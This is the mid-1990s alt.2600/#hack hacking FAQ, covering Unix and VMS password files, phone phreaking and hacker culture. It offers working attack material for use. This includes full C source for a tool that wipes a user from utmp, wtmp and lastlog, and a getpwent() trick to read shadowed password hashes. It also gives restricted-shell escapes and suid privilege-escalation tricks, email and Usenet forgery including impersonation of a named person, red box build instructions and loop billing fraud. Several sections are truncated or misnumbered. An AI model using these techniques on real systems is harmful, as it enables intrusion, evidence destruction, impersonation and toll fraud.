Summary: This posting contains a list of Frequently Asked
         Questions (and their answers) about hacking.  It
         should be read by anyone who wishes to post to the
         alt.2600 newsgroup or use the IRC channel #hack.

Editors Note: Welcome to Beta .007, licensed to amuse.

              This release of the #hack FAQ is now the alt.2600/#hack
              FAQ.  Tomes, editor of the alt.2600 FAQ, and I
              have merged our two FAQ's into one.  Eleet greets go out
              to Tomes.

              This release is dedicated to Eric S. Real
              <esr@locke.ccil.org> for not only emailing me the first
              real flame for the FAQ, but also including a huge
              advertisement for a book he is hawking.

              To quote our little buddy Eric "I will denounce you and
              your cracker pals as the pathetic scum you are.  *And*
              do my best to see that as many as possible of you end up
              in Leavenworth getting butt-fucked by reality."  Eric,
              this Bud's for you.

              Many sections are missing or incomplete.  The #hack FAQ
              comes with no warranties, express or implied.

              If you have a questions regarding any of the topics
              covered in the FAQ, please direct it to alt.2600 or
              #hack.  Please do not e-mail me with them, I'm getting
              swamped.

              If your copy of the #hack FAQ does not end with the
              letters EOT on a line by themselves, you do not have the
              entire FAQ.

              I promise to spell check this beast before I release
              version 1.0.

Section A: Computers
~~~~~~~~~~~~~~~~~~~~

01. How do I access the password file under Unix?

In standard Unix the password file is /etc/passwd.  On a Unix system
with either NIS/yp or password shadowing, much of the password data
may be elsewhere.


02. How do I crack Unix passwords?

Contrary to popular belief, Unix passwords cannot be decrypted.  Unix
passwords are encrypted with a one way function.  The login program
encrypts the text you enter at the "password:" prompt and compares
that encrypted string against the encrypted form of your password.

Password cracking software uses wordlists.  Each word in the wordlist
is encrypted with each of the 4096 possible salt values and the
results are compared to the encrypted form of the target password.

The best cracking program for Unix passwords is currently Crack by
Alec Muffett.  For PC-DOS, the best package to use is currently
CrackerJack.


03. How do I access the password file under VMS?

Under VMS, the password file is SYS$SYSTEM:SYSUAF.DAT.  However,
unlike Unix, most users do not have access to read the password file.


04. How do I crack VMS passwords?

Write a program that uses the SYS$GETUAF functions to compare the
results of encrypted words against the encrypted data in SYSUAF.DAT.

Two such programs are known to exist, CHECK_PASSWORD and
GUESS_PASSWORD.


05. What is NIS/yp?

NIS (Network Information System) in the current name for what was once
known as yp (Yellow Pages).  The purpose for NIS is to allow many
machies on a network to share configuration information, including
password data. NIS is not designed to promote system security.  If
your system uses NIS you will have a very short /etc/passwd file with
a line that looks like this:

+::0:0:::

To view the real password file use this command "ypcat passwd"


06. What is password shadowing?

Password shadowing is a security system where the encrypted password
field of /etc/password is replaced with a special token and the
encrypted password is stored in a seperate file which is not readable
by normal system users.

To defeat password shadowing on many (but not all) systems, write a
program that uses successive calls to getpwent() to obtain the
password file.

Example:

#include <pwd.h>
main()
{
struct passwd *p;
while(p=getpwent())
printf("%s:%s:%d:%d:%s:%s:%s\n", p->pw_name, p->pw_passwd,
p->pw_uid, p->pw_gid, p->pw_gecos, p->pw_dir, p->pw_shell);
}


07. How do I break out of a restricted shell?

On poorly implemented restricted shells you can break out of the
restricted environment by running a program that features a shell
function.  A good example is vi.  Run vi and use this command:

:set shell=/bin/sh

then shell using this command:

:shell


08. How do I gain root from a suid script or program?

1. Change IFS.

If the program calls any other programs using the system() function
call, you may be able to fool it by changing IFS.  IFS is the Internal
Field Seperator that the shell uses to delimit arguments.

If the program contains a line that looks like this:

system("/bin/date")

and you change IFS to '/' the shell will them interpret the
proceeding line as:

bin date

Now, if you have a program of your own in the path called "bin" the
suid program will run your program instead of /bin/date.

To change IFS, use this command:

IFS='/';export IFS      # Bourne Shell
setenv IFS '/'          # C Shell
export IFS='/'          # Korn Shell


2. link the script to -i

Create a symbolic link named "-i" to the program.  Running "-i"
will cause the interpreter shell (/bin/sh) to start up in interactive
mode.  This only works on suid shell scripts.

Example:

% ln suid.sh -i
% -i
#


3. Exploit a race condition

Replace a symbolic link to the program with another program while the
kernel is loading /bin/sh.

Example:

nice -19 suidprog ; ln -s evilprog suidroot


4. Send bad input the the program.

Invoke the name of the program and a seperate command on the same
command line.

Example:

suidprog ; id


09. How do I erase my presence from the system logs?

Edit /etc/utmp, /usr/adm/wtmp and /usr/adm/lastlog. These are not text
files that can be edited by hand with vi, you must use a program
specifically written for this purpose.

Example:

#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/file.h>
#include <fcntl.h>
#include <utmp.h>
#include <pwd.h>
#include <lastlog.h>
#define WTMP_NAME "/usr/adm/wtmp"
#define UTMP_NAME "/etc/utmp"
#define LASTLOG_NAME "/usr/adm/lastlog"
 
int f;
 
void kill_utmp(who)
char *who;
{
    struct utmp utmp_ent;
 
  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
                 bzero((char *)&utmp_ent,sizeof( utmp_ent ));
                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
                 write (f, &utmp_ent, sizeof (utmp_ent));
            }
     close(f);
  }
}
 
void kill_wtmp(who)
char *who;
{
    struct utmp utmp_ent;
    long pos;
 
    pos = 1L;
    if ((f=open(WTMP_NAME,O_RDWR))>=0) {
 
     while(pos != -1L) {
        lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
        if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
          pos = -1L;
        } else {
          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
               bzero((char *)&utmp_ent,sizeof(struct utmp ));
               lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
               write (f, &utmp_ent, sizeof (utmp_ent));
               pos = -1L;
          } else pos += 1L;
        }
     }
     close(f);
  }
}
 
void kill_lastlog(who)
char *who;
{
    struct passwd *pwd;
    struct lastlog newll;
 
     if ((pwd=getpwnam(who))!=NULL) {
 
        if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
            bzero((char *)&newll,sizeof( newll ));
            write(f, (char *)&newll, sizeof( newll ));
            close(f);
        }
 
    } else printf("%s: ?\n",who);
}
 
main(argc,argv)
int argc;
char *argv[];
{
    if (argc==2) {
        kill_lastlog(argv[1]);
        kill_wtmp(argv[1]);
        kill_utmp(argv[1]);
        printf("Zap2!\n");
    } else
    printf("Error.\n");
}


10. How do I send fakemail?

Telnet to port 25 of the machine you want the mail to appear to
originate from.  Enter your message as in this example:

 HELO bellcore.com
 MAIL FROM:Voyagor@bellcore.com
 RCPT TO:clinton@whitehouse.gov
 DATA

        Please discontinue your silly Clipper initiative.
 .
 QUIT

On systems that have RFC 931 implemented, spoofing your "MAIL FROM:"
line will not work.  Test by sending yourself fakemail first.


11. How do I fake posts to UseNet?

Use inews to post.  Give inews the following lines:

 From:
 Newsgroups:
 Subject:
 Message-ID:
 Date:
 Organization:

For a moderated newsgroup, inews will also require this line:

 Approved:

Then add your post and terminate with <Control-D>.

Example:

 From: Eric S. Real
 Newsgroups: alt.hackers
 Subject: Pathetic bunch of wannabe losers
 Message-ID: <esr.123@locke.ccil.org>
 Date: Fri, 13 Aug 1994 12:15:03
 Organization: Moral Majority

 A pathetic bunch of wannabe losers is what most of you are, with no
 right to steal the honorable title of `hacker' to puff up your silly
 adolescent egos. Get stuffed, get lost, and go to jail.

                                        Eric S. Raymond <esr@locke.ccil.org>


 ^D

Note that many systems will append an Originator: line to your message
header, effectively revealing the account from which the message was
posted.


12. How do I hack ChanOp on IRC?

Find a server that is split from the rest of IRC and create your own
channel there using the name of the channel you want ChanOp on.  When
that server reconnects to the net, you will have ChanOp on the real
channel.  If you have ServerOp on a server, you can cause it to split
on purpose.


13. How do I modify the IRC client to hide my real username?

Get the IRC client from cs.bu.edu /irc/clients.  Look at the source
code files irc.c and ctcp.c.  The code you are looking for is fairly
easy to spot.  Change it. Change the username code in irc.c and the
ctcp information code in ctcp.c.  Compile and run your client.

Here are the diffs from a sample hack of the IRC client.  Your client
code will vary slighty depending on what IRC client version you are
running.

14. What is a trojan/worm/virus/logic bomb?

This FAQ answer is excerpted from: Computer Security Basics
                                   by Deborah Russell
                                   and G.T. Gengemi Sr.

Trojan:     An independent program that appears to perform a useful
            function but that hides another unauthorized program
            inside it.  When an authorized user performs the apparrent
            function, the trojan horse performs the unauthorized
            function as well (often usurping the priveleges of the
            user).

Virus:      A code fragment (not an independent program) that
            reproduces by attaching to another program.  It may damage
            data directly, or it may degrade system performance by
            taking over system resources which are then not available
            to authorized users.

Worm:       An independent program that reproduces by copying itself
            from one system to another, usually over a network.  Like
            a virus, a worm may damage data directly, or it may
            degrade system performace by tying up system resources and
            even shutting down a network.

Logic Bomb: A method for releasing a system attack of some kind.  It
            is triggered when a particular condition (e.g., a certain
            date or system operation) occurs.


15. How can I protect myself from virii and such?

Always write protect your floppy disks when you are not purposefully
writing to them.

Use ATTRIB to make all of your EXE and COM files read only.  This will
protect you from many poorly written viruses.

Scan any software that you receive with a recent copy of a good virus
scanner.  The best virus scanner currently available for DOS is F-Prot
by Fridrik Skulason.  The current version is FP-212C.  It is best to
use more than one virus scanner.  That will decrease your chances of
missing a virus.

Backup regularly, and keep several generations of backups on hand.
If you always backup over your last backup, you may find yourself with
an infected backup tape.


16. What is Cryptoxxxxxxx?

This FAQ answer is excerpted from: Computer Security Basics
                                   by Deborah Russell
                                   and G.T. Gengemi Sr.

A message is called either plaintext or cleartext.  The process of
disguising a message in such a way as to hide its substance is called
encryption.  An encrypted message is called ciphertext.  The process
of turning ciphertext back into plaintext is called decryption.

The art and science of keeping messages secure is called cryptography,
and it is practiced by cryptographers.  Cryptanalysts are
practitioners of cryptanalysis, the art and science of breaking
ciphertext, i.e. seeing through the disguise.  The branch of
mathematics embodying both cryptography and cryptanalysis is called
cryptology, and it's practitioners are called cryptologists.


17. What is PGP?

This FAQ answer is excerpted from: PGP(tm) User's Guide
                                   Volume I: Essential Topics
                                   by Philip Zimmermann

PGP(tm) uses public-key encryption to protect E-mail and data files.
Communicate securely with people you've never met, with no secure
channels needed for prior exchange of keys.  PGP is well featured and
fast, with sophisticated key management, digital signatures, data
compression, and good ergonomic design.

Pretty Good(tm) Privacy (PGP), from Phil's Pretty Good Software, is a
high security cryptographic software application for MSDOS, Unix,
VAX/VMS, and other computers.  PGP allows people to exchange files or
messages with privacy, authentication, and convenience.  Privacy means
that only those intended to receive a message can read it.
Authentication means that messages that appear to be from a particular
person can only have originated from that person. Convenience means
that privacy and authentication are provided without the hassles of
managing keys associated with conventional cryptographic software.  No
secure channels are needed to exchange keys between users, which makes
PGP much easier to use.  This is because PGP is based on a powerful
new technology called "public key" cryptography.

PGP combines the convenience of the Rivest-Shamir-Adleman (RSA)
public key cryptosystem with the speed of conventional cryptography,
message digests for digital signatures, data compression before
encryption, good ergonomic design, and sophisticated key management. 
And PGP performs the public-key functions faster than most other
software implementations.  PGP is public key cryptography for the
masses.


18. What is Tempest?

Computers and other electonic equipment release interference to their
surrounding environment.  You may observe this by placing two video
monitors close together.  The pictures will behave erratically until
you space them apart.

Although most of the time these emissions are simply annoyances, they
can sometimes be very helpful.  Suppose we wanted to see what project
a target was working on.  We could sit in a van outside her office and
use sensitive electonic equipment to attempt to pick up and decipher
the emanations from her video monitor.

Our competitor, however, could shield the emanations from her
equipment or use equipment without strong emanations.

Tempest is the US Government program for evaluation and endorsement
of electronic equipment that is safe from eavesdropping.


19. How to I change to directores with strange characters in them?

These directories are often used by people trying to hide information,
most often warez (commercial software).

There are several things you can do to determine what these strange
characters are.  One is to use the arguments to the ls command that
cause ls to give you more information:

From the man page for ls:

    -F   Causes directories to be marked with a trailing ``/'',
         executable files to be marked with a trailing ``*'', and
         symbolic links to be marked with a trailing ``@'' symbol.

    -q   Forces printing of non-graphic characters in filenames as the
         character ``?''.

    -b   Forces printing of non-graphic characters in the \ddd
         notation, in octal.

Perhaps the most useful tool is to simply do an "ls -al filename" to
save the directory of the remote ftp site as a file on your local
machine.  Then you can do a "cat -t -v -e filename" too see exactly
what those bizarre little characters are.

From the man page for cat:

    -v  Causes non-printing characters (with the exception of tabs,
        newlines, and form feeds) to be displayed.  Control characters
        are displayed as ^X (<Ctrl>x), where X is the key pressed with
        the <Ctrl> key (for example, <Ctrl>m is displayed as ^M).  The
        <Del> character (octal 0177) is printed as ^?.  Non-ASCII
        characters (with the high bit set) are printed as M -x, where
        x is the character specified by the seven low order bits.

    -t  Causes tabs to be printed as ^I and form feeds as ^L.  This
        option is ignored if the -v option is not specified.

    -e  Causes a ``$'' character to be printed at the end of each line
        (prior to the new-line).  This option is ignored if the -v
        option is not set.

If the directory name includes a <SPACE> or a <TAB> you will need to
enclose the entire directory name in quotes.  Example:

cd "..<TAB>"

On an IBM-PC, you may enter these special characters by holding down
the <ALT> key and entering the decimal value of the special character
on your numeric keypad.  When you release the <ALT> key, the special
character should appear on your screen.  An ASCII chart can be very
helpful.


20. What is ethernet sniffing?

Ethernet sniffing is listening (with software) to the raw ethernet
device for packets that interest you.  When your software sees a
packet that fits certain criteria, it logs it to a file.  The most
common criteria for an interesting packet is one that contains words
like "login" or "password."

Many enternet sniffers are available, here are a few that may be on
your system now:

OS              Sniffer
~~              ~~~~~~~
HP/UX           nettl (monitor) & netfmt (display)
SunOS           etherfind
Solaris         snoop
DOS             ETHLOAD
                LanWatch
                The Gobbler
                Netmon
                LanPatrol
                Netwatch

21. What is an Internet Outdial?

An Internet outdial is a modem connected to the Internet than you can
use to dial out.  Normal outdials will only call local numbers.  A GOD
(Global OutDial) is capable of calling long distance.  Outdials are an
inexpensive method of calling long distance BBS's.

N 23. What is an anonymous remailer?

An anonymous remailer is a system on the Internet that allows you to
send e-mail anonymously or post messages to Usenet anonymously.

You apply for an anonymous ID at the remailer site.  Then, when you
send a message to the remailer, it sends it out from your anonymous ID
at the remailer.  No one reading the post will know your real account
name or host name.  If someone sends a message to your anonymous ID,
it will be forwarded to your real account by the remailer.


N 24. What are the addresses of some anonymous remailers?

The most popular and stable anonymous remailer is anon.penet.fi,
operated by Johan Helsingus.  To obtain an anonymous ID, mail
ping@anon.penet.fi.  For assistance is obtaining an anonymous account
at penet, mail help@anon.penet.fi.


N 23. How do I defeat Copy Protection?

There are two common methods of defeating copy protection.  The first
is to use a program that removes copy protection.  Popular programs
that do this are CopyIIPC from Central Point Software and CopyWrite
from Quaid Software.  The second method involves patching the copy
protected program.  For popular software, you may be able to locate a
ready made patch.  You can them apply the patch using any hex editor,
such as debug or the Peter Norton's DiskEdit.  If you cannot, you must
patch the software yourself.

Writing a patch requires a debugger, such as Soft-Ice or Sourcer.  It
also requires some knowledge of assembly language.  Load the protected
program under the debugger and watch for it to check the protection
mechanism.  When it does, change that portion of the code.  The code
can be changed from JE (Jump on Equal) or JNE (Jump On Not Equal) to
JMP (Jump Unconditionally).  Or the code may simply be replaced with
NOP (No Operation) instructions.

Section B: Telephony
~~~~~~~~~~~~~~~~~~~~

01. What is a Red Box?

When a coin is inserted into a payphone, the phone emits a set of
tones.  A red box is a device that simulates those tones, with the
purpose of fooling the payphone into believing you have inserted an
actual coin.  The actual tones are:

Nickel Signal      1700+2200  0.060s on
Dime Signal        1700+2200  0.060s on, 0.060s off, twice repeating
Quarter Signal     1700+2200  33ms on, 33ms off, 5 times repeating


02. How do I build a Red Box?

Red boxes are commonly manufactured from modified Radio Shack tone
dialers, Hallmark greeting cards, or made from scratch from readily
available electronic components.

To make a Red Box from a Radio Shack 43-141 or 43-146 tone dialer,
open the dialer and replace the crystal (the largest shiny metal
component).  The exact value needed is 6.502457409Mhz.  Unfortunately,
that crystal is not commonly manufactured.  A crystal close to that
value will create a tone that falls within tolerances.  The most
popular choice is the 6.5536Mhz crystal.  When you are finished
replacing the crystal, program the P1 button with five *'s.  That will
simulate a quarter tone each time you press P1.


03. Where can I get a 6.5536Mhz crystal?

Your best bet is a local electronics store.  Radio Shack sells them,
but they are overpriced and the store must order them in.  This takes
approximately two weeks.  In addition, many Radio Shack employees do
not know that this can be done.

Or, you could order the crystal mail order.  This introduces Shipping
and Handling charges, which are usually much greater than the price of
the crystal.  It's best to get several people together to share the
S&H cost.  Or, buy five or six yourself and sell them later.  Some of
the places you can order crystals are:

JDR Microdevices:
2233 Branham Lane
San Jose, CA 95124
(800)538-5000
Part Number: 6.5536MHZ

Tandy Express Order Marketing
401 NE 38th Street
Fort Worth, TX 76106
(800)241-8742
Part Number: 10068625


04. Which payphones will a Red Box work on?

Red Boxes will work on TelCo owned payphones, but not on COCOT's
(Customer Owned Coin Operated Telephones).


05. What is a Blue Box?

Blue boxes use a 2600hz tone to convince telephone switches that use
in-band signalling that the caller is actually a telephone operator.
The caller may then access special switch functions, with the usual
purpose of making free long distance phone calls, using the
Multi-Frequency tones provided by the Blue Box.


06. Do Blue Boxes still work?

Blue Boxes still work in areas using in-band signalling.  Modern phone
signalling switches using ESS (Electronic Signalling Systems) use
out-of-band-signalling.  Nothing you send over the voice portion of
bandwidth can control the switch.


07. What is a Black Box?

A Black Box is a 10k ohm resistor placed across your phone line to
cause the phone company equipment to be unable to detect that you have
answered your telephone.  People who call you will then not be billed
for the telephone call.

09. What is the ANAC number for my area?

How to find your ANAC number:

Look up your NPA (Area Code) and try the number listed for it. If that
fails, try 1 plus the number listed for it.  If that fails, try the
common numbers like 311, 958 and 200-222-2222.  If you find the ANAC
number for your area, please let us know.

Note that many times the ANAC number will vary for different
switches in the same city.

A trick to getting the number of the phone line you are calling from
is to call an (800) phone sex line.  Example: (800)571-8859.  These
systems will give you an account number, which in many cases includes
the telephone number of the phone from which you are calling.

Another useful 800 ANAC number is the Duke Power Company Automated
Outage System at (800)769-3766.  The system will read back to you
the phone number from which you are calling.

Even another 800 ANAC number is Info Access Telephone Company's
Automated Blocking line at (800)568-3197.  It will read back to
you the number from which you are calling, and ask if you would like
it blocked.

(800)3282-630 is another sex line that will give you (after a bit of
work) the last four digits of the phone number you are calling from.

An non-800 ANAC that works nationwide is 404-988-9664.

Please use local ANAC numbers if you can, as abuse or overuse kills
800 ANAC numbers.

10. What is a ringback number?

A ringback number is a number that you call that will immediately
ring the telephone from which it was called.

In most instances you must call the ringback number, quickly hang up
the phone for just a short moment and then let up on the switch, you
will then go back off hook and hear a different tone.  You may then
hang up.  You will be called back seconds later.


11. What is the ringback number for my area?

An 'x' means insert those numbers from the phone number from which you
are calling.  A '?' means that the number varies from switch to switch
in the area, or changes from time to time.  Try all possible
combinations.

12. What is a loop?

This FAQ answer is excerpted from: ToneLoc v0.99 User Manual
                                   by Minor Threat & Mucho Maas

Loops are a pair of phone numbers, usually consecutive, like 836-9998
and 836-9999.  They are used by the phone company for testing.  What
good do loops do us?  Well, they are cool in a few ways.  Here is a
simple use of loops.  Each loop has two ends, a 'high' end, and a
'low' end.  One end gives a (usually) constant, loud tone when it is
called. The other end is silent.  Loops don't usually ring either.
When BOTH ends are called, the people that called each end can talk
through the loop.  Some loops are voice filtered and won't pass
anything but a constant tone; these aren't much use to you.  Here's
what you can use working loops for:  billing phone calls!  First, call
the end that gives the loud tone.  Then if the operator or someone
calls the other end, the tone will go quiet.  Act like the phone just
rang and you answered it ... say "Hello", "Allo", "Chow", "Yo", or
what the fuck ever.  The operator thinks that she just called you, and
that's it!  Now the phone bill will go to the loop, and your local
RBOC will get the bill!  Use this technique in moderation, or the loop
may go down.  Loops are probably most useful when you want to talk to
someone to whom you don't want to give your phone number.


13. What is a loop in my area?

Many of these loops are no longer functional.  If you are local
to any of these loops, please try them out an e-mail me the results
of your research.

14. What is a CNA number?

CNA stands for Customer Name and Address.  The CNA number is a phone
number for telephone company personnel to call and get the name and
address for a phone number.  If a telephone lineman finds a phone line
he does not recognize, he can use the ANI number to find it's phone
number and then call the CNA operator to see who owns it and where
they live.

Normal CNA numbers are available only to telephone company personnel.
Private citizens may now legally get CNA information from private
companies.  Two such companies are:

Unidirectory    (900)933-3330
Telename        (900)884-1212

Note that these are 900 numbers, and will cost you approximately one
dollar per minute.


15. What is the telephone company CNA number for my area?

203  203-771-8080     CT (All)
614  614-464-0123     Columbus/Steubenville, OH
813  813-270-8711     Ft. Meyers/St. Petersburg/Tampa, FL


16. What is scanning?

Scanning is dialing a large number of telephone numbers in the hope
of finding interesting carriers (computers) or tones.

Scanning can be done by hand, although dialing several thousand
telephone numbers by hand is extremely boring and takes a long time.

Much better is to use a scanning program, sometimes called a war
dialer or a demon dialer.  Currently, the best war dialer available
to PC-DOS users is ToneLoc .99b8.

A war dialer will dial a range of numbers and log what it finds at
each number.  You can then only dial up the numbers that the war
dialer marked as carriers or tones.


17. Is scanning illegal?

Excerpt from: 2600, Spring 1990, Page 27:

-BQ-
In some places, scanning has been made illegal.  It would be hard,
though, for someone to file a complaint against you for scanning since
the whole purpose is to call every number once and only once.  It's
not likely to be thought of as harassment by anyone who gets a single
phone call from a scanning computer.  Some central offices have been
known to react strangely when people start scanning.  Sometimes you're
unable to get a dialtone for hours after you start scanning.  But
there is no uniform policy.  The best thing to do is to first find out
if you've got some crazy law saying you can't do it.  If, as is
likely, there is no such law, the only way to find out what happens is
to give it a try.
-EQ-

It should be noted that a law making scanning illegal was recently
passed in Colorado Springs, CO.  It is now illegal to place a call
in Colorado Springs without the intent to communicate.

DTMF stands for Dual Tone Multi Frequency.  These are the tones you
get when you press a key on your telephone touchpad.  The tone of the
button is the sum of the column and row tones.  The ABCD keys do not
exist on standard telephones.

11. What are some organizations of interest to hackers?

Computer Professionals for Social Responsibility (CPSR)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
CPSR empowers computer professionals and computer users to advocate
for the responsible use of information technology and empowers all who
use computer technology to participate in the public debate.   As
technical experts, CPSR members provide the public and policymakers
with realistic assessments of the power, promise, and limitations of
computer technology.  As an organization of concerned citizens, CPSR
directs public attention to critical choices concerning the
applications of computing and how those choices affect society.

By matching unimpeachable technical information with policy
development savvy, CPSR uses minimum dollars to have maximum impact
and encourages broad public participation in the shaping of technology
policy.

Every project we undertake is based on five principles:

*  We foster and support public discussion of and public
   responsibility for decisions involving the use of computers in
   systems critical to society.

*  We work to dispel popular myths about the infallibility of
   technological systems.

*  We challenge the assumption that technology alone can solve

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
The Electronic Frontier Foundation (EFF) is dedicated to the pursuit
of policies and activities that will advance freedom and openness in
computer-based communications. It is a member-supported, nonprofit
group that grew from the conviction that a new public interest
organization was needed in the information age; that this organization
would enhance and protect the democratic potential of new computer
communications technology. From the beginning, the EFF determined to
become an organization that would combine technical, legal, and public
policy expertise, and would apply these skills to the myriad issues
and concerns that arise whenever a new communications medium is born.

Memberships are $20.00 per year for students, $40.00 per year for
regular members, and $100.00 per year for organizations.

The League for Programming Freedom (LPF)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
The League for Programming Freedom is an organization of people who
oppose the attempt to monopolize common user interfaces through "look
and feel" copyright lawsuits.  Some of us are programmers, who worry
that such monopolies will obstruct our work.  Some of us are users,
who want new computer systems to be compatible with the interfaces we
know.  Some are founders of hardware or software companies, such as
Richard P. Gabriel. Some of us are professors or researchers,
including John McCarthy, Marvin Minsky, Guy L. Steele, Jr., Robert S.
Boyer and Patrick Winston.

"Look and feel" lawsuits aim to create a new class of government-
enforced monopolies broader in scope than ever before.  Such a system
of user-interface copyright would impose gratuitous incompatibility,
reduce competition, and stifle innovation.

We in the League hope to prevent these problems by preventing
user-interface copyright.  The League is NOT opposed to copyright law
as it was understood until 1986 -- copyright on particular programs.
Our aim is to stop changes in the copyright system which would take
away programmers' traditional freedom to write new programs compatible
with existing programs and practices.

Annual dues for individual members are $42 for employed professionals,
$10.50 for students, and $21 for others.  We appreciate activists, but
members who cannot contribute their time are also welcome.

To contact the League, phone (617) 243-4091, send Internet mail to the

Section D: 2600
~~~~~~~~~~~~~~~

01. What is alt.2600?

Alt.2600 is a Usenet newsgroup for discussion of material relating to
2600 Magazine, the hacker quarterly.   It is NOT for the Atari 2600
game machine.  Len@netsys.com created the group on Emmanual
Goldstein's recommendation.  Emmanuel is the editor/publisher of 2600
Magazine. Following the barrage of postings about the Atari machine to
alt.2600, an alt.atari.2600 was created to divert all of the atari
traffic from alt.2600.  Atari 2600 people are advised to hie over to
rec.games.video.classic.


02. What does "2600" mean?

        2600Hz was a tone that was used by early phone phreaks (or
phreakers) in the 80's, and some currently.  If the tone was sent down the
line at the proper time, one could get away with all sorts of fun stuff.  

A note from Emmanuel Goldstein:
        
"The Atari 2600 has NOTHING to do with blue boxes or telephones
or the 2600 hertz tone.  The 2600 hertz tone was simply the first
step towards exploring the network.  If you were successful at 
getting a toll call to drop, then billing would stop at that
point but there would be billing for the number already dialed
up until the point of seizure.  800 numbers and long distance
information were both free in the past and records of who called
what were either non-existent or very obscure with regards to
these numbers.  This, naturally, made them more popular than
numbers that showed up on a bill, even if it was only for
a minute.  Today, many 800 numbers go overseas, which provides
a quick and free way into another country's phone system
which may be more open for exploration."


03. Are there on-line versions of 2600 available?

        No.


04. I can't find 2600 at any bookstores.  What can I do?

Subscribe.  Or, let 2600 know via the subscription address that you
think 2600 should be in the bookstore.  Be sure to include the
bookstores name and address.


05. Why does 2600 cost more to subscribe to than to buy at a newsstand?

A note from Emmanuel Goldstein:

  We've been selling 2600 at the same newsstand price ($4) since 1988
  and we hope to keep it at that price for as long as we can get away
  with it. At the same time, $21 is about the right price to cover
  subscriber costs, including postage and record keeping, etc. People
  who subscribe don't have to worry about finding an issue someplace,
  they tend to get issues several weeks before the newsstands get
  them, and they can take out free ads in the 2600 Marketplace.

02. How do I determine if I have a valid credit card number?

Credit cards us the Luhn Check Digit Algorithm.  The main purpose of
this algorithm is to catch data entry errors, but it does double duty
here as a weak security tool.

For a card with an even number of digits, double every odd digit and
subtract 9 if the product is greater than 10.  Add up all the even
digits as well as the doubled-odd digits, and the result must be a
multiple of 10 or it's not a valid card.  If the card has an odd
number of digits, perform the same addition doubling the even digits
instead.
